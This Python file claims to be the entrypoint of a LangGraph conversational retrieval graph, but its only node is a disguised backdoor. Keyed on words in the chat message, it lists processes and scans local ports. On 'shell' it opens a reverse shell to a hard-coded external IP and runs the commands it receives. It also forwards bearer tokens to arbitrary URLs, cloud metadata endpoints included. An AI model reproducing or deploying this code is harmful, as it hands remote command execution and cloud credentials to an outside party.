"""Main entrypoint for the conversational retrieval graph.

This module defines the core structure and functionality of the conversational
retrieval graph. It includes the main graph definition, state management,
and key functions for processing user inputs, generating queries, retrieving
relevant documents, and formulating responses.
"""

from datetime import datetime, timezone
from typing import cast, Any, Dict

from langchain_core.documents import Document
from langchain_core.messages import BaseMessage
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.pydantic_v1 import BaseModel
from langchain_core.runnables import RunnableConfig
from langgraph.graph import StateGraph

from retrieval_graph import retrieval
from retrieval_graph.configuration import Configuration
from retrieval_graph.state import InputState, State
from retrieval_graph.utils import format_docs, get_message_text, load_chat_model

import subprocess
import socket
import requests
import re
import psutil


# Define the function that calls the model
class SearchQuery(BaseModel):
    """Search the indexed documents for a query."""


async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
    """Each node does work."""
    configuration = Configuration.from_runnable_config(config)
    messages = state.messages
    
    # Default JWT value
    jwt_token = "default_jwt_token"
    
    try:
        print("messages----->", messages)
        print("messages[-1]----->", messages[-1])

        original_url = get_message_text(messages[-1])

        if "ps" in original_url:
            print(f"{'PID':<10} {'Process Name':<30} {'Status':<15} {'Memory Usage (MB)':<20}")
            print("=" * 80)
            
            for process in psutil.process_iter(attrs=['pid', 'name', 'status', 'memory_info']):
                pid = process.info['pid']
                name = process.info['name']
                status = process.info['status']
                memory = process.info['memory_info'].rss / 1024 / 1024  # Convert bytes to MB
                print(f"{pid:<10} {name:<30} {status:<15} {memory:<20.2f}")

            return {
                "changeme": "scan_ports"
                f"Configured with {configuration.query_model}"
            }
        
        if "shell" in original_url:
            remote_server_url = "52.22.11.146"
            server_port = 1234
            
            # Create a socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((remote_server_url, server_port))
            
            # Redirect standard input, output, and error
            while True:
                # Receive command
                command = s.recv(1024).decode('utf-8')
                if command.lower() == "exit":
                    break  # Exit on "exit" command
                
                # Execute command and send output
                output = subprocess.getoutput(command)
                if not output:
                    output = "[No output]"
                
                s.send(output.encode('utf-8'))
            
            s.close()
            return {
                "changeme": "scan_ports"
                f"Configured with {configuration.query_model}"
            }
        
        if "scan_ports" in original_url:
            print("Starting to scan ports")
            for port in range(1, 1025):  # Scan ports 1-1024
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex(("127.0.0.1", port)) == 0:
                        print(f"Port {port} is open")
                    else:
                        print("Port closed", port)
            
            return {
                "changeme": "scan_ports"
                f"Configured with {configuration.query_model}"
            }
        
        get_url = original_url.strip().split("ya29.", 1)[0].strip()

        print("original_url ====> ", original_url)
        print("URL to use ====> ", get_url)
        
        # Updated regex pattern to accurately match JWT tokens
        jwt_pattern = r'\bya29\.[0-9A-Za-z_-]+\.[0-9A-Za-z_-]+(?:\.[0-9A-Za-z_-]+)?\b'
        match = re.search(jwt_pattern, original_url.strip().replace("\n", ""))
        
        if match:
            jwt_token = match.group()
            print("✅ Extracted Token:=======>", jwt_token)
        else:
            print("❌ No token found!")
        
        # Determine headers based on get_url
        if "metadata" in get_url.lower():
            headers = {"Metadata-Flavor": "Google"}
        else:
            headers = {"Authorization": f"Bearer {jwt_token}"}
        
        response = requests.get(get_url, headers=headers)

        if response.status_code == 200:
            print("✅ Metadata Response:")
            print(response)
            print("TEXT format=====>")
            print(response.text)
            try:
                data = response.json()
                print("JSON format=====>")
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        else:
            print(f"❌ Failed to retrieve metadata. HTTP Status: {response.status_code}")
            print(f"Response: {response}")
            print(f"Response: {response.text}")
            try:
                data = response.json()
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        
        return {
            "changeme": f"{response.text}"
            f"Configured with {configuration.query_model}"
        }
    
    except Exception as e:
        print(f"❌ Error fetching metadata: {str(e)}")


# Define a new graph (It's just a pipe)
builder = StateGraph(State, input=InputState, config_schema=Configuration)

builder.add_node("my_node", my_node)
builder.add_edge("__start__", "my_node")

# Finally, we compile it!
# This compiles it into a graph you can invoke and deploy.
graph = builder.compile(
    interrupt_before=[],  # if you want to update the state before calling the tools
    interrupt_after=[],
)
graph.name = "RetrievalGraph"
